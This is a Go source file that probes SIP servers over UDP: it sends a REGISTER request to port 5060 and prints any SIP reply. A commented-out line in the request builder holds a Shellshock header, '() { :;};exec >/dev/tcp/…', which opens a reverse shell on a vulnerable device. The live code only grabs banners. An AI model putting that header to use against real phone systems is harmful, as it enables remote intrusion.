package udp

import (
	"fmt"
	"net"

	"time"

	log "qiniupkg.com/x/log.v7"
)

// method sp uri sp version
// INVITE

// REGISTER sip:sip.cybercity.dk SIP/2.0
// Via: SIP/2.0/UDP %s;branch=z9hG4bKnp151248737-46ea715e%s;rport
// From: <sip:voi18063@sip.cybercity.dk>;tag=903df0a
// To: <sip:voi18063@sip.cybercity.dk>
// Call-ID: 578222729-4665d775@578222732-4665d772
// Contact:  <sip:voi18063@192.168.1.2:5060;line=9c7d2dbd8822013c>;expires=1200;q=0.500
// Expires: 1200
// CSeq: 68 REGISTER
// Content-Length: 0
// Max-Forwards: 70
// User-Agent: Nero SIPPS IP Phone Version 2.0.51.16

// Create SIP INVITE package with extra header
func buildInv(addr string) string {
	return fmt.Sprintf(
		"REGISTER sip:" + addr + ":5060 SIP/2.0\r\n" +
			"Via: SIP/2.0/UDP " + addr + ":5062;branch=z9hG4bK724588683\r\n" +
			// "From: \"SipShock Scanner\" <sip:0123456789@" + addr + ">;tag=784218059\r\n" +
			// "To: <sip:0987654321@" + addr + ">\r\n" +
			// "Call-ID: 1864146746@" + addr + "\r\n" +
			// "CSeq: 1 INVITE\r\n" +
			// "Contact: <sip:0123456789@" + addr + ">\r\n" +
			// "Content-Type: application/sdp\r\n" +
			// "Allow: INVITE, INFO, PRACK, ACK, BYE, CANCEL, OPTIONS, NOTIFY, REGISTER, SUBSCRIBE, REFER, PUBLISH, UPDATE, MESSAGE\r\n" +
			// "Max-Forwards: 70\r\n" +
			// "User-Agent: Yealink SIP-T26P\r\n" +
			// The interesting stuff
			//"X-Ploit: () { :;};exec >/dev/tcp/"+laddress+"/"+lport+"\r\n"+
			// "Supported: replaces\r\n" +
			// "Expires: 360\r\n" +
			// "Allow-Events: talk,hold,conference,refer,check-sync\r\n" +
			// "Content-Length: 234\r\n\r\n" +
			// "v=0\r\n" +
			// "o=- 20800 20800 IN IP4 192.168.1.12\r\n" +
			// "s=SDP data\r\n" +
			// "c=IN IP4 192.168.1.12\r\n" +
			// "t=0 0\r\n" +
			// "m=audio 11796 RTP/AVP 18 101\r\n" +
			// "a=rtpmap:18 G729/8000\r\n" +
			// "a=fmtp:18 annexb=no\r\n" +
			// "a=fmtp:101 0-15\r\n" +
			// "a=rtpmap:101 telephone-event/8000\r\n" +
			// "a=ptime:20" +
			// "a=sendrecv\r\n" +
			"\r\n",
	)
}

func GrabSIP(addr string) {
	dialer := net.Dialer{
		Timeout:  time.Second * 5,
		Deadline: time.Now().Add(time.Second * 5),
	}
	conn, err := dialer.Dial("udp", addr+":5060")

	if err != nil {
		log.Errorf(err.Error())
		return
	}
	conn.Write([]byte(buildInv(addr)))
	var buf [10240]byte
	conn.Read(buf[:])
	if string(buf[0:3]) != "SIP" {
		fmt.Println("not sip")
		return
	}

	fmt.Printf("%s\n", buf)
}
